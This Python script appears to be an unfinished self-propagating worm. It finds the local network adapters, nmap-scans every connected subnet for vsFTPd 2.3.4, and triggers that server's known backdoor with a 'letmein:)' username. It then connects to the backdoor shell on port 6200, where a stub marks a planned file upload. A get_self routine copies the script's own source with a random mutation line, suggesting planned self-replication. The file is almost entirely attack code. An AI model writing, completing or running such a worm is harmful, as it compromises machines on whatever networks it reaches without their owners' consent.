#!/usr/bin/env python3
# import os
# import sys
import ifaddr
import netaddr
import nmap
import socket
import time
import random


def main():
    # Get network cards from the system
    adapters = get_adapters(ip_version=4, ignore=['lo0', 'lo', 'en0'])

    # Locate vulnerable machines on connected networks
    targets = scan_networks(adapters)

    # Exploits backdoor in vsFTPd 2.3.4 - OSVDB-73573
    # https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor
    exploit(targets)


def get_adapters(ip_version=4, ignore=[]):
    adapters = ifaddr.get_adapters()
    networks = []

    # Returns ip addresses based on IP version, default is IPv4
    for ad in adapters:
        if ad.name not in ignore:
            if ip_version != 6:
                [networks.append(n) for n in ad.ips if ':' not in n.ip[0]]
            else:
                [networks.append(n) for n in ad.ips if ':' in n.ip[0]]

    return networks


def scan_networks(adapters):
    scanner = nmap.PortScanner()
    targets = []

    for adapter in adapters:
        ip_address = '{}/{}'.format(adapter.ip, adapter.network_prefix)

        if DEBUG:
            print('[+] Preparing to scan network on:', adapter.nice_name)
            print('[+] Calculating network based on ip', ip_address)

        # Get the network name from adapter ip
        network = netaddr.IPAddress(netaddr.IPNetwork(ip_address).first)

        if DEBUG:
            print('[+] Found network', network, 'for ip', adapter.ip, 'with CIDR', adapter.network_prefix)

        # Runs the following nmap command: nmap -sV -PN -T5 -p 21 <ip-address>
        result = scanner.scan(hosts='{}/{}'.format(network, adapter.network_prefix), ports='21', arguments='-sV -PN -T5')

        nodes = []

        for node in result['scan']:
            ftp_port = result['scan'][node]['tcp'][21]

            # Check for open port (tcp 21) and check if server is running the vulnerable version of vsFTPd
            if ftp_port['state'] == 'open':
                if ftp_port['product'] == 'vsftpd' and ftp_port['version'] == '2.3.4':
                    nodes.append(node)

        # The ip addresses of any vulnerable machine found are appended to the list of vulnerable machines
        if len(nodes) > 0:
            targets += nodes

        if DEBUG:
            print('[+] Found', len(targets), 'targets')

    return targets


def exploit(targets):
    # Todo; add functionality to the exploitation to work with IPv6
    for target in targets:
        try:
            # Connect to TCP port 21
            ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ftp.connect((target, 21))

            # Trigger the backdoor by passing a :) to the server with the username
            ftp.send(b'USER letmein:)\n')
            ftp.send(b'PASS please\n')
            time.sleep(2)
            ftp.close()
        except Exception as e:
            if DEBUG:
                print('[*] Unable to successfully trigger backdoor. Exception:', e)
        
        try:
            backdoor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            backdoor.connect((target, 6200))
            #
            # Upload file here
            #
        except Exception as e:
            if DEBUG:
                print(e)


def get_self():
    f = open(__file__, 'r')
    self_content = f.readlines()
    f.close()
    self_content.insert(1, format('#{}\n'.format(random_string())))
    print(self_content)
    return self_content


def random_string():
    salt = ''
    for i in range(0, random.randint(1, 400)):
        salt += chr(random.randint(0, 255))
    return salt


if __name__ == '__main__':
    DEBUG = True
    main()
